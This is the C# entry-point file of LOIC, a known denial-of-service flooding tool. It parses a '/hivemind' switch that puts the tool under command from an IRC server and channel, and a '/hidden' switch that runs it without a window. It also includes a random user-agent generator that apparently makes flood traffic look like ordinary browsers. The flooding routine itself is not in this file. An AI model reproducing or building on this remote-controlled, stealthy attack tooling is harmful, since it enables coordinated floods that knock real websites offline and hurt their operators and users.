using System;
using System.Windows.Forms;
using System.Text;

namespace LOIC
{
	static class Program
	{
		[STAThread]
		static void Main(string[] cmdLine)
		{
			bool hive = false;
			bool hide = false;
			/* IRC */
			string ircserver = "";
			string ircport = "";
			string ircchannel = "";
			/* Lets try this! */
			int count = 0;
			foreach (string s in cmdLine)
			{
				/* IRC */
				if(s.ToLower() == "/hivemind")
				{
					hive = true;
					ircserver = cmdLine[count + 1]; //if no server entered let it crash
					try {ircport = cmdLine[count + 2];}
					catch (Exception) {ircport = "6667";} //default
					try {ircchannel = cmdLine[count + 3];}
					catch (Exception) {ircchannel = "#loic";} //default
				}
				/* Lets try this! */
				if(s.ToLower() == "/hidden") {hide = true;}
				count++;
			}
			//Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			Application.Run(new frmMain(hive, hide, ircserver, ircport, ircchannel));
		}
	}
	public class Functions
	{
		public static string RandomString()
		{
			StringBuilder builder = new StringBuilder();
			Random random = new Random();
			char ch;
			for (int i = 0; i < 6; i++)
			{
				ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
				builder.Append(ch);
			}
			return builder.ToString();
		}

		public static string RandomUserAgent()
		{
			Random random = new Random();

			String[] osversions  = {"5.1","6.0","6.1"};
			String[] oslanguages = {"en-GB","en-US","es-ES","pt-BR","pt-PT","sv-SE"};

			String version   = osversions[ random.Next(0, osversions.Length-1) ];
			String language  = oslanguages[ random.Next(0, oslanguages.Length-1) ];
			String useragent = String.Format("Mozilla/5.0 (Windows; U; Windows NT {0}; {1}; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17", version, language);

			return useragent;
		}
	}
}